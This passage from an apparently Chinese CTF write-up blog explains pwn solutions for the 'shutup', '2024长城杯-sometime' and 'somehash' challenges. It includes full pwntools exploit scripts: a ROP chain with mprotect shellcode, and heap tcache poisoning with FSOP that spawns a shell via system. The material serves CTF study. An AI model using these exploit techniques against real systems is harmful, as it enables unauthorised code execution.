class="number">0</span>:</span><br><span class="line">			payload+=p64(addr)</span><br><span class="line">		payload+=p64(pop_rdi_ret)+p64(shellcode[i])</span><br><span class="line">		payload+=p64(<span class="number">0x4006BB</span>)</span><br><span class="line">		addr+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
<p>开头的64字节放不下的ropchain和shellcode就可以利用这个放置</p>
<p>到此思路就明朗了</p>
<p>只需要解决最后一个问题,如果布置系统调用号??题目中是没有可用的gadget的</p>
<p>其实上面已经提过一嘴了</p>
<p>我们可以在开始读取64字节的时候,就写入一个10(mprotect系统调用号)在内存中,之后再通过<code>sub_4006B7</code>取出放置到rax中,最后通过csu调用mprotect并返回到shellcode处getflag</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./shutup&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>				:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>		:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> 						:p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content			:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content			:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content					:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content					:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> 						:p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content					:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr 				:log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line">	<span class="keyword">if</span>(script):</span><br><span class="line">		gdb.attach(p, script)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		gdb.attach(p)</span><br><span class="line">		pause()</span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">	<span class="keyword">if</span>(local):</span><br><span class="line">		<span class="keyword">return</span> process(elf_path)</span><br><span class="line">	<span class="keyword">return</span> remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">more</span>(<span class="params">addr,shellcode</span>):</span><br><span class="line">	payload=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode)):</span><br><span class="line">		<span class="keyword">if</span> shellcode[i]==<span class="number">0</span>:</span><br><span class="line">			addr+=<span class="number">1</span></span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">if</span> i !=<span class="number">0</span>:</span><br><span class="line">			payload+=p64(addr)</span><br><span class="line">		payload+=p64(pop_rdi_ret)+p64(shellcode[i])</span><br><span class="line">		payload+=p64(<span class="number">0x4006BB</span>)</span><br><span class="line">		addr+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">sys_ret=<span class="number">0xbc375</span></span><br><span class="line">read=<span class="number">0xf7250</span></span><br><span class="line">offset=sys_ret-read</span><br><span class="line">pop_rdi_ret=<span class="number">0x4007e3</span></span><br><span class="line">pop_rbp_ret=<span class="number">0x4005c0</span> </span><br><span class="line">leave_ret=<span class="number">0x40073E</span></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1=p64(<span class="number">0x6013b0</span>)+p64(<span class="number">0x4006FC</span>)</span><br><span class="line">payload1+=p64(<span class="number">0x4006b7</span>)+p64(<span class="number">10</span>)</span><br><span class="line">payload1+=tbs(offset)</span><br><span class="line">payload1+=<span class="string">b&#x27;\0&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload1+=p64(<span class="number">0x6013b8</span>)+p64(leave_ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s(payload1)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;8000&#x27;</span>)</span><br><span class="line">rop_chain=p64(<span class="number">0x4007DA</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x601390</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">103</span>)+p64(<span class="number">0x4007C0</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">1</span>)+p64(<span class="number">0x601060</span>)+p64(<span class="number">7</span>)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0x601000</span>)+p64(<span class="number">0x4007C0</span>)+p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x601600</span>)</span><br><span class="line"></span><br><span class="line">shellcode=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">shellcode+=shellcraft.read(<span class="number">3</span>,<span class="number">0x601800</span>,<span class="number">32</span>)</span><br><span class="line">shellcode+=shellcraft.write(<span class="number">1</span>,<span class="number">0x601800</span>,<span class="number">32</span>)</span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>+p64(<span class="number">0x6013c4</span>)</span><br><span class="line">payload2+=more(<span class="number">0x6013c4</span>,rop_chain)+p64(<span class="number">0x601604</span>)</span><br><span class="line">payload2+=more(<span class="number">0x601604</span>,shellcode)+p64(<span class="number">0x601380</span>)</span><br><span class="line">payload2+=p64(pop_rdi_ret)+p64(<span class="number">0xFFFFFFEF</span>)+p64(<span class="number">0x4006B7</span>)+p64(<span class="number">0x400715</span>)</span><br><span class="line">s(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">p.shutdown(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
<h1 id="2024长城杯-sometime"><a href="#2024长城杯-sometime" class="headerlink" title="2024长城杯-sometime"></a>2024长城杯-sometime</h1><p><strong>标签:堆重叠|FSOP</strong></p>
<p>靠,犯蠢有点严重</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_BYTE *)now = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>一直没注意到强转成byte指针了,以为是整个置零,导致完全不知道有什么用</p>
<p>题目保护是全开的,都是现在glibc堆题常规了</p>
<p>提供了add,show,delete三个功能</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="type">int</span>)now;</span><br><span class="line">  <span class="keyword">if</span> ( now )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, *(<span class="type">const</span> <span class="type">char</span> **)now);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> nbytes; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">void</span> *nbytes_4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  now = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size&gt; &quot;</span>);</span><br><span class="line">  result = (<span class="type">void</span> *)getint();</span><br><span class="line">  nbytes = (<span class="type">unsigned</span> <span class="type">int</span>)result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)result &lt;= <span class="number">0x100</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    nbytes_4 = <span class="built_in">malloc</span>((<span class="type">int</span>)result);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;note&gt; &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, nbytes_4, nbytes);</span><br><span class="line">    result = now;</span><br><span class="line">    *(_QWORD *)now = nbytes_4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( now )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="type">void</span> **)now);</span><br><span class="line">    <span class="built_in">free</span>(now);</span><br><span class="line">    now = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>限制了申请chunk的大小,且对chunk的操作仅限于刚申请出来时的初始化</p>
<p>乍一看没有漏洞点,但是函数在开始时注册了一个watch函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">signal(<span class="number">14</span>, watch);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">watch</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( op )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( op == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      evil_behave(<span class="string">&quot;(The system will self-destruct in 1 seconds.)&quot;</span>, <span class="number">1000000LL</span>);</span><br><span class="line">      evil_behave(<span class="string">&quot;(The system will self-destruct in 0 seconds.)&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    some_say(<span class="string">&quot;success! I arrive that.&quot;</span>, <span class="number">1000000LL</span>);</span><br><span class="line">    evil_say(<span class="string">&quot;Who is there!&quot;</span>, <span class="number">500000LL</span>);</span><br><span class="line">    some_say(<span class="string">&quot;Damn! He found us. Hury up!&quot;</span>, <span class="number">1000000LL</span>);</span><br><span class="line">    evil_say(<span class="string">&quot;!!!!!!&quot;</span>, <span class="number">2000000LL</span>);</span><br><span class="line">    evil_say(</span><br><span class="line">      <span class="string">&quot;Do you honestly believe pulling off something this amateurish will get you a shell? It&#x27;s downright laughable.&quot;</span>,</span><br><span class="line">      <span class="number">500000LL</span>);</span><br><span class="line">    evil_behave(<span class="string">&quot;(The system will self-destruct in 20 seconds.)&quot;</span>, <span class="number">1000000LL</span>);</span><br><span class="line">    some_say(<span class="string">&quot;I can only assist up to this point. Sorry.&quot;</span>, <span class="number">100000LL</span>);</span><br><span class="line">    alarm(<span class="number">0x14</span>u);</span><br><span class="line">    *(_BYTE *)now = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ++op;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一次时间到的时候会有一次将now的最低字节改为0</p>
<p>这有什么用??毕竟我们又不能利用now指针写,只能拿去释放</p>
<p>但我们知道free时的绝大部分检查都是基于<code>size</code>域的,若我们伪造一个位于tcache范围外的size,并通过各种检查</p>
<p>那么释放的时候,岂不是就能获得一个unsorted chunk,再利用切割特性就能泄露libc</p>
<p>当然伪造的时候需要注意,free的指针指向一个<code>0x100</code>对齐的区域,所以size需要布置在上一个<code>0xf8</code>处</p>
<p>到此为止,我们已经能够获得libcbase与heapbase,准备工作已经就绪</p>
<p>现在思路很明确,任意写修改vtable完成fsop利用</p>
<p>至于任意写思路很清晰,劫持tcache,这也是本题一大难点,因为对chunk的操作限制极大,同一种大小的chunk几乎只能申请一个,当然不释放的情况下能有多个,但不释放之后却也完全无法对这个chunk进行任何操作</p>
<p>但之前我们利用unsorted完成了一个堆块堆叠,我们可以申请一个较大的堆块A堆叠两个较小的堆块BC</p>
<p>其中大小满足A&gt;B+C&amp;&amp;B!=C,我自己选择的是<code>0x110,0x40,0x50</code></p>
<p>然后B,C是位于tcache链中的,考虑到tcache取出时对size几乎没有任何检查</p>
<p>我们第一次申请A写B和C的size为<code>0x101</code>,然后申请B和C出来,并在申请完成后立即释放此时BC会被放置到<code>0x100</code>链</p>
<p>再一次申请A并写C的next为stderr的地址,最后两次申请出stderr,完成house of apple利用</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./sometime&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>				:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>		:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> 						:p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content			:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content			:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content					:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content					:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> 						:p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content					:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr 				:log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line">	<span class="keyword">if</span>(script):</span><br><span class="line">		gdb.attach(p, script)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		gdb.attach(p)</span><br><span class="line">		pause()</span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">	<span class="keyword">if</span>(local):</span><br><span class="line">		<span class="keyword">return</span> process(elf_path)</span><br><span class="line">	<span class="keyword">return</span> remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">cho</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;(1:add,2:release,3:print)&gt; &#x27;</span>,tbs(cho))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;size&gt; &#x27;</span>,tbs(size))</span><br><span class="line">	sa(<span class="string">b&#x27;note&gt; &#x27;</span>,content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">	menu(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">	menu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0x421</span>))</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0xe0</span>,<span class="string">b&#x27;d&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0xd0</span>,<span class="string">b&#x27;e&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0xc0</span>,<span class="string">b&#x27;f&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0xb0</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x48</span>+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;I can only assist up to this point. Sorry.\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;g&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;g&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">libc.address=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x21a0d0</span></span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;g&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;g&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_base=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x2f0</span></span><br><span class="line">leak(<span class="string">&#x27;heap&#x27;</span>,heap_base)</span><br><span class="line">stderr=libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x101</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0x101</span>))</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x101</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0x101</span>)+p64((stderr)^(heap_base&gt;&gt;<span class="number">12</span>)))</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0x00</span>:<span class="string">b&#x27;  sh\0&#x27;</span>,</span><br><span class="line"><span class="number">0xd8</span>:libc.address+<span class="number">0x2160c0</span>,</span><br><span class="line"><span class="number">0xa0</span>:stderr-<span class="number">0x10</span>,</span><br><span class="line"><span class="number">0x8</span>:<span class="number">0</span>,</span><br><span class="line"><span class="number">0x20</span>:<span class="number">0</span>,</span><br><span class="line"><span class="number">0xd0</span>:stderr-<span class="number">0x10</span>,</span><br><span class="line"><span class="number">0x58</span>:libc.sym[<span class="string">&#x27;system&#x27;</span>],</span><br><span class="line"><span class="number">0x28</span>:<span class="number">1</span>,</span><br><span class="line"><span class="number">0x30</span>:<span class="number">0</span></span><br><span class="line">&#125;,</span><br><span class="line">filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">length=<span class="number">0xe0</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,payload)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
<p><strong>2024长城杯-somehash</strong></p>
<p><strong>标签:负数溢出|格式化字符串漏洞</strong></p>
<p>这题的漏洞点在于没有对负数进行检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v10 = getint(<span class="string">&quot;name length&gt; &quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( v10 &gt; <span class="number">256</span> )</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;name&gt; &quot;</span>);</span><br><span class="line">buf[v10] = read(<span class="number">0</span>, buf, (<span class="type">unsigned</span> __int16)v10);</span><br></pre></td></tr></table></figure>
<p>导致可以在bss上buf往前任意写一个字节,但这有什么用呢</p>
<p>我们可以知道这题是partial relro,并且可以发现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">sub_2476((<span class="type">unsigned</span> <span class="type">int</span>)dword_5078);</span><br><span class="line">v6 = <span class="built_in">strlen</span>(buf);</span><br></pre></td></tr></table></figure>
<p>那么有没有可能在strlen解析之前,修改其got表为printf的got表,毕竟二者刚好只有一个字节之差,而且任意写一字节漏洞刚好位于strlen之前</p>
<p>并且，printf的返回值是输出字符的数量，strlen也是字符数量，并不影响后续程序的逻辑</p>
<p>另外这题别被hash表的计算干扰了,其和解题基本没有关系</p>
